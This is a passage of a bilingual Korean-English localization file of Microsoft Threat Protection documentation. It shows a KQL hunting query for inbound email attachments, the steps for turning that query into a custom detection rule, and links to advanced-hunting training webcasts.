<span data-ttu-id="20556-340">이제 사용자가 첨부 파일을 열거나 저장 한 모든 인바운드 전자 메일을 식별 하는 쿼리를 만들었습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-340">You have now created a query that will identify all inbound emails where the user opened or saved the attachment.</span></span> <span data-ttu-id="20556-341">또한이 쿼리를 구체화 하 여 특정 보낸 사람 도메인, 파일 크기, 파일 형식 등을 필터링 할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-341">You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.</span></span>

7.  <span data-ttu-id="20556-342">기능은 전파, 서명자 및 발급자 정보와 같은 파일에 대 한 추가 TI 데이터를 가져올 수 있는 특별 한 유형의 조인입니다.  파일에 대 한 자세한 내용을 보려면 **Fileprofile ()** 함수 향상을 사용 하십시오.</span><span class="sxs-lookup"><span data-stu-id="20556-342">Functions are a special sort of join which let you pull more TI data about a file like its prevalence, signer and issuer info, etc.  To get more details on the file, use the **FileProfile()** function enrichment:</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
| join DeviceFileEvents on SHA256 
| where ActionType == "FileCreated"
| distinct SHA1
| invoke FileProfile()
```


<span data-ttu-id="20556-343">**검색 만들기**</span><span class="sxs-lookup"><span data-stu-id="20556-343">**Create a detection**</span></span>

<span data-ttu-id="20556-344">나중에 발생 한 경우에 대 한 **알림을 받을** 정보를 식별 하는 쿼리를 만든 후에는 쿼리에서 사용자 지정 검색을 만들 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-344">Once you have created a query that identifies information that you would like to **get alerted** about if they happen in the future, you can create a custom detection from the query.</span></span> 

<span data-ttu-id="20556-345">사용자 지정 검색은 설정한 빈도에 따라 쿼리를 실행 하 고, 쿼리 결과는 선택 하는 영향을 받는 자산에 따라 보안 경고를 만듭니다.</span><span class="sxs-lookup"><span data-stu-id="20556-345">Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose.</span></span> <span data-ttu-id="20556-346">이러한 경고는 인시던트와 연관 되며, 제품 중 하나에서 생성 된 다른 보안 알림과 마찬가지로 심사 될 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-346">Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.</span></span>

1.  <span data-ttu-id="20556-347">쿼리 페이지에서 찾기 지침의 7 단계에서 추가한 줄 7과 8을 제거 하 고 **검색 규칙 만들기**를 클릭 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-347">On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**.</span></span> 
    
    ![고급 구하기 페이지에서 검색 규칙 만들기를 클릭할 수 있는 위치 스크린샷](../../media/mtp/fig22.png) 

>[!NOTE]
><span data-ttu-id="20556-349">**검색 규칙 만들기** 를 클릭 하는 경우 쿼리에 구문 오류가 있으면 검색 규칙이 저장 되지 않습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-349">If you click **Create detection rule** and you have syntax errors in your query, your detection rule won’t be saved.</span></span> <span data-ttu-id="20556-350">쿼리를 두 번 검사 하 여 오류가 없는지 확인 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-350">Double-check your query to ensure there’s no errors.</span></span> 


2.  <span data-ttu-id="20556-351">보안 팀이 경고를 이해 하 고, 생성 된 이유 및 수행할 것으로 예상 되는 작업을 확인할 수 있도록 하는 정보로 필수 필드를 채웁니다.</span><span class="sxs-lookup"><span data-stu-id="20556-351">Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take.</span></span> 

    ![알림 세부 정보를 정의할 수 있는 만들기 검색 규칙 페이지의 스크린샷](../../media/mtp/fig23.png)

<span data-ttu-id="20556-353">필드를 명확 하 게 채워 다음 사용자에 게이 검색 규칙에 대 한 의사 결정을 내리는 데 도움을 주어 야 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-353">Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert</span></span> 

3.  <span data-ttu-id="20556-354">이 경고의 영향을 받는 엔터티를 선택 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-354">Select what entities are impacted in this alert.</span></span> <span data-ttu-id="20556-355">이 경우에는 **장치** 및 **사서함**을 선택 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-355">In this case, select **Device** and **Mailbox**.</span></span>

    ![영향을 받는 엔터티의 매개 변수를 선택할 수 있는 만들기 검색 규칙 페이지 스크린샷](../../media/mtp/fig24.png)
 

4.  <span data-ttu-id="20556-357">경고가 트리거되는 경우 수행할 작업을 결정 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-357">Determine what actions should take place if the alert is triggered.</span></span> <span data-ttu-id="20556-358">이 경우에는 다른 작업을 수행할 수 있지만 바이러스 백신 검사를 실행 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-358">In this case, run an antivirus scan, though other actions could be taken.</span></span> 

    ![위협 해결을 위해 경고가 트리거될 때 바이러스 백신 검사를 실행할 수 있는 만들기 검색 규칙 페이지의 스크린샷](../../media/mtp/fig25.png) 

5.  <span data-ttu-id="20556-360">알림 규칙의 범위를 선택 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-360">Select the scope for the alert rule.</span></span> <span data-ttu-id="20556-361">이 쿼리는 장치를 포함 하므로 Microsoft Defender ATP 컨텍스트에 따라 장치 그룹이이 사용자 지정 검색과 관련이 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-361">Since this query involve devices, the device groups are relevant in this custom detection according to Microsoft Defender ATP context.</span></span>  <span data-ttu-id="20556-362">영향을 받는 엔터티로 장치를 포함 하지 않는 사용자 지정 검색을 만드는 경우 범위가 적용 되지 않습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-362">When creating a custom detection that does not include devices as impacted entities, scope does not apply.</span></span>  

    ![알림 규칙의 범위를 설정할 수 있는 만들기 검색 규칙 페이지의 스크린샷에 따라 표시 되는 결과에 대 한 기대치가 관리 됩니다.](../../media/mtp/fig26.png) 

<span data-ttu-id="20556-364">이 파일럿에서이 규칙을 프로덕션 환경의 테스트 장치 하위 집합으로 제한할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-364">For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.</span></span>

6.  <span data-ttu-id="20556-365">**만들기**를 선택합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-365">Select **Create**.</span></span> <span data-ttu-id="20556-366">그런 다음 탐색 패널에서 **사용자 지정 검색 규칙** 을 선택 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-366">Then, select **Custom detection rules** from the navigation panel.</span></span>
 
    ![메뉴의 사용자 지정 검색 규칙 옵션 스크린샷](../../media/mtp/fig27a.png) 

    ![규칙 및 실행 세부 정보를 표시 하는 검색 규칙 페이지 스크린샷](../../media/mtp/fig27b.png) 

<span data-ttu-id="20556-369">이 페이지에서 세부 정보 페이지를 여는 검색 규칙을 선택할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-369">From this page, you can select the detection rule which will open a details page.</span></span> 

![규칙 실행 상태, 트리거된 경고 및 작업, 검색 편집 등을 볼 수 있는 전자 메일 첨부 파일 페이지 스크린샷](../../media/mtp/fig28.png) 

### <a name="additional-advanced-hunting-walk-through-exercises"></a><span data-ttu-id="20556-371">추가 고급 구하기 단계별 연습</span><span class="sxs-lookup"><span data-stu-id="20556-371">Additional advanced hunting walk-through exercises</span></span>

<span data-ttu-id="20556-372">고급 구하기에 대 한 자세한 내용은 다음 웹캐스트에서 MTP (Microsoft Threat Protection) 내의 고급 구하기 기능을 사용 하 여 크로스-기둥 쿼리를 만들고, 엔터티에 대 한 피벗을 수행 하 고, 사용자 지정 검색 및 재구성 작업을 만듭니다.</span><span class="sxs-lookup"><span data-stu-id="20556-372">To learn more about advanced hunting, the following webcasts will walk you through the capabilities of advanced hunting within Microsoft Threat Protection (MTP) to create cross-pillar queries, pivot to entities and create custom detections and remediation actions.</span></span>

>[!NOTE]
><span data-ttu-id="20556-373">파일럿 테스트 랩 환경에서 구하기 쿼리를 실행 하려면 자체 GitHub 계정을 사용 하 여 준비 해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-373">Be prepared with your own GitHub account to run the hunting queries in your pilot test lab environment.</span></span>  

| <span data-ttu-id="20556-374">**제목**</span><span class="sxs-lookup"><span data-stu-id="20556-374">**Title**</span></span> | <span data-ttu-id="20556-375">**설명**</span><span class="sxs-lookup"><span data-stu-id="20556-375">**Description**</span></span> | <span data-ttu-id="20556-376">**MP4 다운로드**</span><span class="sxs-lookup"><span data-stu-id="20556-376">**Download MP4**</span></span> | <span data-ttu-id="20556-377">**YouTube에서 보기**</span><span class="sxs-lookup"><span data-stu-id="20556-377">**Watch on YouTube**</span></span> | <span data-ttu-id="20556-378">**사용할 CSL 파일**</span><span class="sxs-lookup"><span data-stu-id="20556-378">**CSL file to use**</span></span> |
|:-----|:-----|:-----|:-----|:-----|
| <span data-ttu-id="20556-379">에피소드 1: KQL 기본</span><span class="sxs-lookup"><span data-stu-id="20556-379">Episode 1: KQL fundamentals</span></span> | <span data-ttu-id="20556-380">Microsoft Threat Protection의 고급 구하기 기능에 대 한 기본 사항을 다루겠습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-380">We’ll cover the basics of advanced hunting capabilities in Microsoft Threat Protection.</span></span> <span data-ttu-id="20556-381">사용 가능한 고급 구하기 데이터 및 기본 KQL 구문 및 연산자에 대해 알아봅니다.</span><span class="sxs-lookup"><span data-stu-id="20556-381">Learn about available advanced hunting data and basic KQL syntax and operators.</span></span> | [<span data-ttu-id="20556-382"> MP4</span><span class="sxs-lookup"><span data-stu-id="20556-382"> MP4</span></span>](https://aka.ms/MTP15JUL20_MP4) | [<span data-ttu-id="20556-383">YouTube</span><span class="sxs-lookup"><span data-stu-id="20556-383">YouTube</span></span>](https://youtu.be/0D9TkGjeJwM) | [<span data-ttu-id="20556-384">에피소드 1: Git의 CSL 파일</span><span class="sxs-lookup"><span data-stu-id="20556-384">Episode 1: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
| <span data-ttu-id="20556-385">에피소드 2: 조인</span><span class="sxs-lookup"><span data-stu-id="20556-385">Episode 2: Joins</span></span> | <span data-ttu-id="20556-386">계속 해 서 고급 사냥의 데이터에 대해 배우고 테이블을 함께 조인 하는 방법을 알아봅니다.</span><span class="sxs-lookup"><span data-stu-id="20556-386">We’ll continue learning about data in advanced hunting and how to join tables together.</span></span> <span data-ttu-id="20556-387">내부, 외부, 고유 및 세미 조인 및 기본 Kusto innerunique join의 nuances에 대해 알아봅니다.</span><span class="sxs-lookup"><span data-stu-id="20556-387">Learn about inner, outer, unique, and semi joins, and the nuances of the default Kusto innerunique join.</span></span> | [<span data-ttu-id="20556-388">MP4</span><span class="sxs-lookup"><span data-stu-id="20556-388">MP4</span></span>](https://aka.ms/MTP22JUL20_MP4) | [<span data-ttu-id="20556-389">YouTube</span><span class="sxs-lookup"><span data-stu-id="20556-389">YouTube</span></span>](https://youtu.be/LMrO6K5TWOU) | [<span data-ttu-id="20556-390">에피소드 2: Git의 CSL 파일</span><span class="sxs-lookup"><span data-stu-id="20556-390">Episode 2: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
| <span data-ttu-id="20556-391">에피소드 3: 데이터 요약, 피벗 및 시각화</span><span class="sxs-lookup"><span data-stu-id="20556-391">Episode 3: Summarizing, pivoting, and visualizing data</span></span>|<span data-ttu-id="20556-392">이제 데이터를 필터링, 조작 및 조인할 수 있으므로 요약, 수량화, 피벗/시각화를 시작 해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-392">Now that we’re able to filter, manipulate, and join data, it’s time to start summarizing, quantifying, pivoting, and visualizing.</span></span> <span data-ttu-id="20556-393">이 에피소드에서는 요약 연산자와 고급 구하기 스키마에서 추가 테이블을 소개 하는 동안 수행할 수 있는 몇 가지 계산에 대해 설명 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-393">In this episode, we’ll cover the summarize operator and some of the calculations you can perform while diving into additional tables in the advanced hunting schema.</span></span> <span data-ttu-id="20556-394">데이터 집합은 분석을 개선 하는 데 도움이 되는 차트로 변환 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-394">We turn our datasets into charts that can help improve analysis.</span></span> | [<span data-ttu-id="20556-395">MP4</span><span class="sxs-lookup"><span data-stu-id="20556-395">MP4</span></span>](https://aka.ms/MTP29JUL20_MP4) | [<span data-ttu-id="20556-396">YouTube</span><span class="sxs-lookup"><span data-stu-id="20556-396">YouTube</span></span>](https://youtu.be/UKnk9U1NH6Y) | [<span data-ttu-id="20556-397">에피소드 3: Git의 CSL 파일</span><span class="sxs-lookup"><span data-stu-id="20556-397">Episode 3: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl) |
| <span data-ttu-id="20556-398">에피소드 4: 이번에는 사냥을 사용 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-398">Episode 4: Let’s hunt!</span></span> <span data-ttu-id="20556-399">인시던트 추적에 KQL 적용</span><span class="sxs-lookup"><span data-stu-id="20556-399">Applying KQL to incident tracking</span></span>|<span data-ttu-id="20556-400">일부 공격자 활동을 추적 하는 데 걸리는 시간입니다.</span><span class="sxs-lookup"><span data-stu-id="20556-400">Time to track some attacker activity!</span></span> <span data-ttu-id="20556-401">이 에피소드에서는 Microsoft Threat Protection의 KQL 및 고급 구하기에 대 한 향상 된 이해를 활용 하 여 공격을 추적 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-401">In this episode, we’ll use our improved understanding of KQL and advanced hunting in Microsoft Threat Protection to track an attack.</span></span> <span data-ttu-id="20556-402">Cybersecurity의 ABCs와이를 인시던트 응답에 적용 하는 방법을 비롯 하 여 공격자 활동을 추적 하기 위해 필드에 사용 되는 몇 가지 팁과 트릭을 알아봅니다.</span><span class="sxs-lookup"><span data-stu-id="20556-402">Learn some of the tips and tricks used in the field to track attacker activity, including the ABCs of cybersecurity and how to apply them to incident response.</span></span> | [<span data-ttu-id="20556-403">MP4</span><span class="sxs-lookup"><span data-stu-id="20556-403">MP4</span></span>](https://aka.ms/MTP5AUG20_MP4) | [<span data-ttu-id="20556-404">YouTube</span><span class="sxs-lookup"><span data-stu-id="20556-404">YouTube</span></span>](https://youtu.be/2EUxOc_LNd8) | [<span data-ttu-id="20556-405">에피소드 4: Git의 CSL 파일</span><span class="sxs-lookup"><span data-stu-id="20556-405">Episode 4: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl) |

## <a name="next-step"></a><span data-ttu-id="20556-406">다음 단계</span><span class="sxs-lookup"><span data-stu-id="20556-406">Next step</span></span>
|<span data-ttu-id="20556-407">![마감 및 요약 단계](../../media/mtp/close.png)</span><span class="sxs-lookup"><span data-stu-id="20556-407">![Closing and summary phase](../../media/mtp/close.png)</span></span> <br>[<span data-ttu-id="20556-408">마감 및 요약 단계</span><span class="sxs-lookup"><span data-stu-id="20556-408">Closing and summary phase</span></span>](mtp-pilot-close.md) | <span data-ttu-id="20556-409">Microsoft Threat Protection 파일럿 결과를 분석 하 고 관련자에 게 제공 하 고 다음 단계를 수행 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-409">Analyze your Microsoft Threat Protection pilot outcome, present them to your stakeholders, and take the next step.</span></span>
|:-----|:-----|

